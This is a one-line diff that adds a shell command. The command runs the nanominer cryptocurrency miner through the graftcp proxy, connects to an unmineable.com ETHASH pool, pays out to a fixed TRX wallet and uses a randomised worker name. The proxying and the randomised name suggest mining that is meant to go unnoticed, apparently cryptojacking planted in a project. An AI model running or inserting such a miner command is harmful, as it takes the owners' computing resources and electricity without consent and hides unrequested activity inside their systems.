@@ -1,0 +1,1 @@
+./graftcp/graftcp ./nanominer --algo ETHASH --pool ethash-us.unmineable.com:13333 --user TRX:TWaMNYJS8hLkrsvjQ8DNJSMuWPjJxUq8zR.$(echo nano-$(shuf -i 1-99 -n 1))#hdij-gkd6 --ethstratum ETHPROXY
